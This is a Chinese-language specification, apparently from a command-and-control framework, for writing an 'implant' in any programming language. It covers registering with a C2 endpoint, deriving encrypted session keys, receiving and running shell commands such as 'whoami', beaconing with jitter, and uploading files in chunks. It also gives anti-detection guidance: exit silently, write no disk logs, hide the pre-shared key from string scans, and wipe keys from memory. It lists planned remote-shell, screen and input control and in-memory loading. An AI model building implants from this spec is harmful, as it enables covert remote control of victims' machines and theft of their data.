# 04-01 · 植入体规范（语言无关）

> 目标：**任何人用任何语言**，照这份文档就能写出能上线的植入体。
> 你需要的只有三样：HTTP(S) 客户端、P-256 ECDH、AES-256-GCM + HKDF-SHA256。
> 参考实现：[clients/go](../../clients/go/README.md)（纯标准库，可直接编译）。

---

## 1. 你必须实现的最小闭环

```
① 配置：endpoint / psk_id / psk / op_pub / op_fp
② 注册：POST /v1/register  → sid / tok / op_pub / cfg
③ 派生：ECDH(implant_eph_priv, op_pub) → Z → HKDF → K_cmd / K_io / K_file
④ 回连：WS（主）或 POST /v1/beacon（兜底）
⑤ 收任务：解密 cmd 帧 → 执行 → 加密 res 帧 → 回传
```

做到这五步就是"能上线、能执行、能看到回显"。

---

## 2. 配置字段

| 字段 | 来源 | 说明 |
|---|---|---|
| `endpoint` | 控制台 | `https://c2.example.com`（**edge worker**，不是 console） |
| `psk_id` | 控制台创建载荷时 | b64u(8B) |
| `psk` | 控制台（**只显示一次**） | b64u(32B) |
| `op_pub` | 控制台 | b64u(65B) 未压缩 P-256 点 |
| `op_fp` | 控制台 | `SHA256(op_pub)[:8]` 的 hex（16 字符） |
| `hb` / `jitter` | 控制台 / register 响应 | 心跳秒数与抖动 |
| `transport` | 控制台 | `["ws","http"]` |

**注入方式**（按语言选）：

| 语言 | 做法 |
|---|---|
| Go | `-ldflags "-X main.cfgPsk=..."` |
| Rust | `include_bytes!(concat!(env!("OUT_DIR"), "/cfg.bin"))` 或 `env!` |
| C/C++ | 生成 `config.h` 后 `#include` |
| C# / .NET | 生成 `Config.g.cs` 常量类 |
| Python | 打包成单文件时用 Nuitka/PyInstaller 的 `--include-data-files`，或直接写进源码 |

> ⚠️ 配置是"一次性的身份"，不要放在可枚举的路径里，也不要读环境变量（会被进程枚举看到）。

---

## 3. 注册（第一步）

```http
POST {endpoint}/v1/register
Content-Type: application/json

{
  "v": 1,
  "psk_id": "<b64u(8B)>",
  "ts": 1763000000,
  "nc": "<b64u(16B) 随机>",
  "h": "<b64u(32B) HMAC>",
  "pub": "<b64u(65B) 本次进程的 ECDH 公钥>",
  "fp": "<SHA256(pub)[:8] hex>"
}
```

计算：

```
K_reg = HKDF-SHA256(ikm = psk, salt = empty, info = "stc2/v1/reg", L = 32)
msg   = psk_id + "." + ts + "." + nc          # 都是字符串原样拼接
h     = HMAC-SHA256(K_reg, msg)
```

响应：

```json
{
  "v": 1, "sid": "...", "tok": "...", "srv_ts": 1763000001,
  "op_pub": "...", "op_fp": "9f2c1a7b3d4e5f60", "key_id": "k_...",
  "next": 300,
  "cfg": { "hb": 60, "jitter": 0.2, "max_frame": 1048576, "chunk": 4194304, "meta_mode": "plain" }
}
```

**必做的校验**（不做就等于把加密交给中间人）：

1. `SHA256(op_pub)[:8] hex == 内置的 op_fp`，不等 → **静默退出**。
2. 响应里 `v == 1`。
3. `tok` 非空。

---

## 4. 派生会话密钥

```
priv, pub = P-256 keypair（每次进程启动重新生成，不落盘）
Z         = ECDH(priv, op_pub)                     # 32 字节
K_cmd     = HKDF-SHA256(Z, salt = sid_bytes, info = "stc2/v1/cmd",  L=32)
K_io      = HKDF-SHA256(Z, salt = sid_bytes, info = "stc2/v1/io",   L=32)
K_file    = HKDF-SHA256(Z, salt = sid_bytes, info = "stc2/v1/file", L=32)
```

- `sid_bytes` = base64url 解码后的 16 字节（**不是字符串**）。
- AES 密钥就是这 32 字节；GCM 的 nonce 12 字节、tag 16 字节（追加在密文尾部，标准 GCM 输出）。

---

## 5. 收任务：解密

一帧 `cmd` 的样子：

```json
{ "v":1, "t":"cmd", "sid":"...", "seq":12, "n":"<b64u(12B)>", "ct":"<b64u>",
  "meta": { "tid":"...", "rid":"<b64u(8B)>", "cat":"shell", "exp":1763000060 } }
```

解密步骤：

```
nonce  = b64u_decode(n)                 # 12 字节
ctr    = big-endian-u64(nonce[4:12])    # 后 8 字节就是计数器
rid    = b64u_decode(meta.rid)          # 8 字节
aad    = "stc2/v1" || 0x00 || sid_bytes || be64(ctr) || rid
plain  = AES-256-GCM-Open(K_cmd, nonce, ct, aad)
```

- `dir`：**操作员→植入体 = 0x00**，植入体→操作员 = 0x01。
- AAD 任何一字节不同都会解密失败——这是防重放/防挪用的关键，**不要"失败就忽略 AAD 重试"**。
- `ctr` 必须**严格递增**（每会话每方向）；收到不大于上次的 `ctr` 直接丢弃。
- `meta.exp` 过期（`now > exp`）就丢弃，并回一条 `ok=false, err="expired"`。

明文（L2）：

```json
{ "k": "shell.exec", "a": { "cmd": "whoami" }, "rid": "<b64u(8B)>", "ts": 1763000000, "ttl": 60 }
```

---

## 6. 回传结果：加密

```
ctr_out  += 1
nonce_out = 4 字节随机前缀 || be64(ctr_out)      # 前缀每进程生成一次
aad_out   = "stc2/v1" || 0x01 || sid_bytes || be64(ctr_out) || rid
plain_out = {"k":"shell.exec","rid":"...","ok":true,"out":"...","err":null,"exit":0}
ct_out    = AES-256-GCM-Seal(K_cmd, nonce_out, plain_out, aad_out)
```

帧：

```json
{ "v":1, "t":"res", "sid":"...", "seq":13,
  "n":"<b64u(nonce_out)>", "ct":"<b64u(ct_out)>",
  "meta": { "tid":"<原样带回>", "rid":"<原样带回>", "sz":<ct 字节数>, "done":true } }
```

- `tid` 必须**原样带回**（服务端靠它把结果挂到任务上）。
- `rid` 也必须原样带回（解密端要用它算 AAD）。
- 结果 > 64 KB：先 `PUT /v1/file/:tid/:idx` 写 R2，`res` 里只带引用（见 §9）。

---

## 7. 心跳与节奏

| 项 | 规则 |
|---|---|
| 心跳 | 固定字节串 `{"v":1,"t":"hb","seq":0}`（WS 走自动应答，零成本） |
| HTTP 兜底 | 每 `hb` 秒一次 `POST /v1/beacon`，带 `hb` + 积压结果 |
| 抖动 | `sleep = hb * (1 ± jitter)`，jitter 默认 0.2 |
| 退避 | 连不上：5s → 15s → 45s → 120s → 最多 30min，成功即重置 |
| 401/403 | **停止**（凭据被吊销），清内存密钥后退出 |
| 1027/1102 | Cloudflare 层限流/超限，间隔 ×3 |

---

## 8. HTTP 兜底通道

```http
POST {endpoint}/v1/beacon
Authorization: Bearer <tok>

{ "v":1, "sid":"...", "up":[ <帧>... ], "ack":["<tid>"], "want":8 }
```

- `up` ≤ 32 帧、≤ 256 KB。
- 响应 `{ "down":[ <cmd 帧>... ], "next":300 }`，`down` ≤ 20 帧。
- 收到 `X-STC2-Throttle: 1` 就把间隔拉长到 900 s。

---

## 9. 文件（分片走 R2）

**上传（implant → 云端）**

```
PUT {endpoint}/v1/file/{tid}/{idx}
Authorization: Bearer <tok>
X-STC2-Total: <总片数>
X-STC2-Size:  <本片字节数>
X-STC2-SHA256: <本片 sha256 hex>
<二进制>
```

**下载（云端 → implant）**：`GET {endpoint}/v1/file/{tid}/{idx}`。

片大小 4 MiB；`idx` 从 0 开始；`tid` 由控制台在任务参数里给。

---

## 10. 各语言原语对照

| 原语 | Go | Rust | C# | Python | C（OpenSSL） |
|---|---|---|---|---|---|
| P-256 ECDH | `crypto/ecdh` | `p256` + `elliptic_curve` | `ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256)` | `cryptography.hazmat.primitives.asymmetric.ec` | `EC_KEY` + `ECDH_compute_key` |
| HKDF-SHA256 | 手写（~25 行）或 `x/crypto/hkdf` | `hkdf` crate | `HKDF.DeriveKey` (.NET 5+) | `HKDF` | `EVP_PKEY_CTX_set_hkdf_md` |
| AES-256-GCM | `crypto/cipher` | `aes-gcm` | `AesGcm` | `AESGCM` | `EVP_aes_256_gcm` |
| HMAC-SHA256 | `crypto/hmac` | `hmac` + `sha2` | `HMACSHA256` | `hmac` | `HMAC()` |
| base64url | `base64.RawURLEncoding` | `base64::URL_SAFE_NO_PAD` | `Base64Url`（.NET 9）/ 手写 | `base64.urlsafe_b64encode` 去 `=` | 手写或 `EVP_EncodeBlock` 后替换 |

> 所有语言的实现行为必须一致。**改算法 = 改协议版本**，不支持"各端自定义变体"。

---

## 11. 上线前自查（12 条）

- [ ] `op_fp` 校验失败时**静默退出**（不重试、不打日志、不留文件）
- [ ] 401/403 → 停止，不再打服务端
- [ ] 每进程重新生成 ECDH 密钥（不落盘、不复用）
- [ ] 收到 AAD 校验失败的帧 → 丢弃 + 计数，**不尝试解密第二次**
- [ ] `ctr` 严格递增，持久化在内存（重启换会话即重置）
- [ ] `rid` 去重（LRU ≥ 256），同 rid 只执行一次
- [ ] 任务 `exp` 过期就丢弃
- [ ] 结果先入本地队列，网络失败不丢（内存队列上限 64 条，满了丢最旧）
- [ ] 心跳用固定串（WS）
- [ ] 退出时清内存密钥（Go: `runtime.KeepAlive` 之外还要把 slice 清零）
- [ ] 不写磁盘日志
- [ ] 二进制里不出现明文的 endpoint 之外的敏感串（PSK 至少做一次 Xor/编码，别用 `strings` 就能 grep 到）

---

## 12. 参考实现的差距（明确写出来）

| 能力 | Go 参考实现 |
|---|---|
| WS 主通道 | ❌（HTTP beacon 已通） |
| 文件分片 | ❌ |
| PTY/交互 shell | ❌ |
| 屏幕/键鼠 | ❌ |
| 内存加载 | ❌ |

这些不是"协议不支持"，而是"参考实现没写"。协议层已经留好 `io` / `file` / `screen` 三类帧，
实现它们不需要改服务端。
